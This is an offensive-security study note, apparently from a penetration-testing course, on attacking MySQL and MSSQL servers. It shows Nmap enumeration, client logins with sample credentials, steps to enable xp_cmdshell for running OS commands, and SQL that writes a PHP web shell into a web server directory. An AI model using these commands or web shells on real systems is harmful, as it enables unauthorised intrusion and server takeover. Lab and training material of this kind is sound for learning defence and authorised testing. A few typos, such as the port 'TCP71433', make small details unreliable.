- [Attacking SQL](#attacking-sql)
  - [Enumeration](#enumeration)
  - [Authentication Methods](#authentication-methods)
  - [Misconfigurations](#misconfigurations)
    - [Privileges](#privileges)
  - [Protocol Specific Attacks](#protocol-specific-attacks)
    - [SQL Default Databases](#sql-default-databases)
      - [MySQL Default System Schemas/Databases](#mysql-default-system-schemasdatabases)
      - [MSSQL Default System Schemas/Databases](#mssql-default-system-schemasdatabases)
    - [Read/Change the Database](#readchange-the-database)
    - [Execute Commands](#execute-commands)
    - [Write Local Files](#write-local-files)

---

# Attacking SQL

## Enumeration

By default MSSQL uses ports TCP71433 and UDP/1434, and MySQL uses TCP/3306. However, when MSSQL operates in a "hidden" mode, it uses TCP/2433 port. You can use Nmap's default scripts ```-sC``` option to enumerate database services on a target system.

```bash
d41y@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

The scan reveals essential information about the target, like the version and hostname, which you can use to identify common misconfigurations, specific attacks, or known vulnerabilities.

## Authentication Methods

MSSQL supports two authentication methods, which means that users can be created in Windows or the SQL server:

| Authentication Type | Description |
| ------------------- | ----------- |
| Windows authentication mode | This is the default, often referred to as integrated security because the SQL server security model is tightly integrated with Windows/AD. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| Mixed mode | ... supports authentication by Windows/AD accounts and SQL Server. Username and password pairs are maintained within SQL Server. |

MySQL also supports different authentication methods, such as username and password, as well as Windows authentication. In addition, admins can choose an authentication mode for many reasons, including compability, security, and more. However, depending on which method is implemented, misconfigurations can occur.

## Misconfigurations

Misconfigured authentication in SQL Server can let you access the service without credentials if anonymous access is enabled, a user without a password is configured, or any user, group, or machine is allowed to access the SQL Server.

### Privileges

Depending on the user's privileges, you maye be able to perform different actions within a SQL Server, such as:

- read or change the contents of a database
- read or change the server configuration
- execute commands
- read local files
- communicate with other databases
- capture the local system hash
- impersonate existing users
- gain access to other networks

## Protocol Specific Attacks

### SQL Default Databases

It is essential to know the default databases for MySQL and MSSQL. Those databases hold information about the database itself and help you enumerate database names, tables, columns, etc. With access to those databases, you can use some system stored procedures, but they usually don't contain company data.

#### MySQL Default System Schemas/Databases

- **mysql**: is the system database that contains tables that store information required by the MySQL server
- **information_schema**: provides access to database metadata
- **performance_schema**: is a feature for monitoring MySQL Server execution at a low level
- **sys**: a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

#### MSSQL Default System Schemas/Databases

- **master**: keeps the information for an instance of SQL Server
- **msdb**: used by SQL Server Agent
- **model**: a template database copied for each new database
- **resource**: a read-only database that keeps system objects visible in every database on the server in sys schema
- **tempdb**: keeps temporary objects for SQL queries

### Read/Change the Database

Imagine you gained access to a SQL database. First, you need to identify existing databases on the server, what tables the database contains, and finally, the contents of each table. Keep in mind that you may find databases with hundreds of tables. If your goal is not just getting access to the data, you will need to pick which table may contain interesting information to continue your attacks, such as usernames and passwords, tokens configurations, and more.

```bash
d41y@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

... or:

```
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

If you're targeting MSSQL from Linux, you can use ```sqsh``` as an alternative to ```sqlcmd```:

```bash
d41y@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

Alternatively, you can use the tool from Impacket with the name mssqlclient.py.

```bash
d41y@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

When using Windows authentication, you need to specify the domain name or the hostname of the target machine. If you don't specify a domain or hostname, it will assume SQL authentication and authenticate against the users created in the SQL server. Instead, if you define the domain or hostname, it will use Windows authentication. If you are targeting a local account, you can use ```SERVERNAME\\accountname``` or ```.\\accountname```.

```bash
d41y@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

### Execute Commands

Command execution is one of the most desired capabilities when attacking common services because it allows you to control the OS. If you have the appropriate privileges, you can use the SQL database to execute system commands or create the necessary elements to do it.

MSSQL has a extended stored procedures called ```xp_cmdshell``` which allow you to execute system commands using SQL. Keep in mind the following about it:

- xp_cmdshell is a powerful feature and disabled by default. xp_cmdshell can be enabled and disabled by using the Policy-Based Management or by executing ```sp_configure```.
- The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account.
- xp_cmdshell operates synchronously. Control is not returned to the caller until the command-shell command is completed.

To execute commands using SQL syntax on MSSQL, use:

```
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

If xp_cmdshell is not enabled, you can enable it, if you have the appropriate privileges, using the following command:

```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

There are other methods to get command execution, such as adding extended stored procedures, CLR Assemblies, SQL Server Agent Jobs, and external scripts. However, besides those methods there are also additional functionalities that can be used like the xp_regwrite command that is used to elevate privileges by creating new entries in the Windows registry.

MySQL supports User Defined Functions which allows you to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repo](https://github.com/mysqludf/lib_mysqludf_sys). It is not recommended to encounter a user-defined function like this in a production environment, but you should be aware that yoz may be able to use it.

### Write Local Files

MySQL does not have a stored procedure like xp_cmdshell, but you can achieve command execution if you write to a location in the file system that can execute your command. For example, suppose MySQL operates on a PHP-based web server or other programming languages like ASP.NET. If you have the appropriate privileges, you can attempt to write a file using ```SELECT INTO OUTFILE``` in the webserver directory. Then you can browse to the location where the file is and execute your commands.

```
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

In MySQL, a global system variable ```secure_file_priv``` limits the effect of data import and export operations, such as those performed by the ```LOAD DATA``` and ```SELECT ... INTO OUTFILE``` statements and the ```LOAD_FILE()``` function. These operations are permitted only to users who have the FILE privilege.

```secure_file_priv``` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits the import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

In the following example, you can see the ```secure_file_priv``` variable is empty, which means you can read and write data using MySQL.

```
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

To write files using MSSQL, you need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:

```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

...

1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

